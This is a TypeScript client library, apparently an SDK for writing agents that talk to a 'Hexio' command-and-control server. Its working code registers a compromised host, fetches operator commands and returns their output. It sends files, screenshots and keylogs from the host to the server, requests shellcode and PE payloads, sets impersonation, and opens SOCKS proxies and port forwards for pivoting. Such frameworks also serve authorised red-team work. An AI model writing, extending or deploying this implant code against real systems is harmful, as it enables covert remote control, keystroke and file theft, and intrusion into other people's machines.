// Hexio External Agent SDK for TypeScript / JavaScript.
//
// Works on Node 18+ (built-in fetch), Bun, Deno, and any modern browser.
// No runtime dependencies.

export interface RegisterRequest {
  hostname: string;
  ip: string;
  user: string;
  os: string;
  process: string;
  arch: string;
  pid: number;
  client_type: string;
  sleep_time?: number;
}

export interface RegisterResponse {
  agent_id: number;
  token: string;
}

export interface Command {
  id: number;
  command: string;
}

export interface CheckinResponse {
  commands: Command[];
  files?: unknown[];
}

export interface DownloadInitRequest {
  file_name: string;
  agent_path: string;
  file_size: number;
  chunk_size: number;
  total_chunks: number;
}

export interface DownloadInitResponse {
  download_id: string;
  agent_path: string;
}

export interface FileRequest {
  bof_files?: string[];
  pe_files?: string[];
  dll_files?: string[];
  elf_files?: string[];
  macho_files?: string[];
  shellcode_files?: string[];
  hexlang?: string[];
}

export class HexioApiError extends Error {
  statusCode: number;
  constructor(statusCode: number, message: string) {
    super(`API error (${statusCode}): ${message}`);
    this.statusCode = statusCode;
    this.name = "HexioApiError";
  }
}

export interface HexioClientOptions {
  /** Override the fetch implementation (useful for custom agents / tests). */
  fetch?: typeof fetch;
  /** Request timeout in ms. Default: 30_000. */
  timeoutMs?: number;
}

export class HexioClient {
  baseUrl: string;
  passphrase: string;
  token: string | null = null;
  agentId: number | null = null;

  private readonly fetchImpl: typeof fetch;
  private readonly timeoutMs: number;

  constructor(baseUrl: string, passphrase: string, opts: HexioClientOptions = {}) {
    this.baseUrl = baseUrl.replace(/\/+$/, "");
    this.passphrase = passphrase;
    this.fetchImpl = opts.fetch ?? globalThis.fetch;
    this.timeoutMs = opts.timeoutMs ?? 30_000;
    if (!this.fetchImpl) {
      throw new Error("No fetch implementation available. Use Node 18+ or pass opts.fetch.");
    }
  }

  private async request<T = any>(method: string, path: string, body?: unknown): Promise<T> {
    const url = this.baseUrl + path;
    const headers: Record<string, string> = {
      HexioExternalAgentAuth: this.passphrase,
    };
    if (this.token) headers.HexioAgentToken = this.token;

    let payload: string | undefined;
    if (body !== undefined) {
      headers["Content-Type"] = "application/json";
      payload = JSON.stringify(body);
    }

    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), this.timeoutMs);

    let resp: Response;
    try {
      resp = await this.fetchImpl(url, {
        method,
        headers,
        body: payload,
        signal: controller.signal,
      });
    } finally {
      clearTimeout(timer);
    }

    const text = await resp.text();
    if (!resp.ok) {
      let message = text;
      try {
        const parsed = JSON.parse(text);
        if (parsed && typeof parsed.error === "string") message = parsed.error;
      } catch {}
      throw new HexioApiError(resp.status, message);
    }

    if (!text) return {} as T;
    return JSON.parse(text) as T;
  }

  // --- Registration ---

  async register(req: RegisterRequest): Promise<RegisterResponse> {
    const resp = await this.request<RegisterResponse>("POST", "/register", req);
    this.token = resp.token;
    this.agentId = resp.agent_id;
    return resp;
  }

  // --- Checkin / Sync ---

  checkin(): Promise<CheckinResponse> {
    return this.request<CheckinResponse>("GET", "/agent/checkin");
  }

  sync(sleepTime?: number, sleepJitter?: number): Promise<any> {
    let body: any;
    if (sleepTime !== undefined) {
      const sleep: Record<string, number> = { sleep_time: sleepTime };
      if (sleepJitter !== undefined) sleep.sleep_jitter = sleepJitter;
      body = { sleep };
    }
    return this.request("POST", "/agent/sync", body);
  }

  syncRaw(body: Record<string, any>): Promise<any> {
    return this.request("POST", "/agent/sync", body);
  }

  // --- Command Response ---

  commandResponse(commandId: number, command: string, response: string): Promise<any> {
    return this.request("POST", "/agent/command/response", {
      command_id: commandId,
      command,
      response,
    });
  }

  // --- Downloads ---

  downloadInit(req: DownloadInitRequest): Promise<DownloadInitResponse> {
    return this.request<DownloadInitResponse>("POST", "/agent/download/init", req);
  }

  downloadChunk(downloadId: string, chunk: Uint8Array): Promise<any> {
    return this.request("POST", "/agent/download/chunk", {
      download_id: downloadId,
      chunk_data: toBase64(chunk),
    });
  }

  downloadCancel(downloadId: string): Promise<any> {
    return this.request("POST", "/agent/download/cancel", { download_id: downloadId });
  }

  async downloadFile(filePath: string, data: Uint8Array, chunkSize = 65536): Promise<string> {
    const name = filePath.split(/[\\/]/).pop() ?? filePath;
    const cs = chunkSize < 1 ? 1 : chunkSize;
    const total = Math.ceil(data.length / cs);
    const init = await this.downloadInit({
      file_name: name,
      agent_path: filePath,
      file_size: data.length,
      chunk_size: cs,
      total_chunks: total,
    });
    for (let i = 0; i < total; i++) {
      await this.downloadChunk(init.download_id, data.subarray(i * cs, (i + 1) * cs));
    }
    return init.download_id;
  }

  // --- Screenshots / Keylogs ---

  screenshot(filename: string, imageData: Uint8Array): Promise<any> {
    return this.request("POST", "/agent/screenshot", {
      filename,
      data: toBase64(imageData),
    });
  }

  keylog(filename: string, data: string): Promise<any> {
    return this.request("POST", "/agent/keylog", { filename, data });
  }

  // --- Impersonation ---

  setImpersonation(user: string): Promise<any> {
    return this.request("POST", "/agent/impersonation", { user });
  }

  clearImpersonation(): Promise<any> {
    return this.setImpersonation("");
  }

  // --- Side Channel ---

  sidechannel(channelId: string, dataB64: string): Promise<any> {
    return this.request("POST", "/agent/sidechannel", {
      channel_id: channelId,
      data: dataB64,
    });
  }

  // --- File Requests ---

  requestFiles(req: FileRequest): Promise<any> {
    return this.request("POST", "/agent/files/request", req);
  }

  // --- SOCKS ---

  socksOpen(port?: number): Promise<any> {
    return this.request("POST", "/agent/socks/open", port !== undefined ? { port } : {});
  }

  socksClose(): Promise<any> {
    return this.request("POST", "/agent/socks/close", {});
  }

  socksSync(data: unknown): Promise<any> {
    return this.request("POST", "/agent/socks/sync", data);
  }

  // --- Port Forwarding ---

  portfwdOpen(port: number, remoteHost: string, remotePort: number): Promise<any> {
    return this.request("POST", "/agent/portfwd/open", {
      port,
      remote_host: remoteHost,
      remote_port: remotePort,
    });
  }

  portfwdClose(port: number): Promise<any> {
    return this.request("POST", "/agent/portfwd/close", { port });
  }

  portfwdSync(data: unknown): Promise<any> {
    return this.request("POST", "/agent/portfwd/sync", data);
  }
}

function toBase64(bytes: Uint8Array): string {
  if (typeof Buffer !== "undefined") {
    return Buffer.from(bytes).toString("base64");
  }
  let binary = "";
  for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
  // btoa is available in browsers and modern Deno/Bun
  return btoa(binary);
}
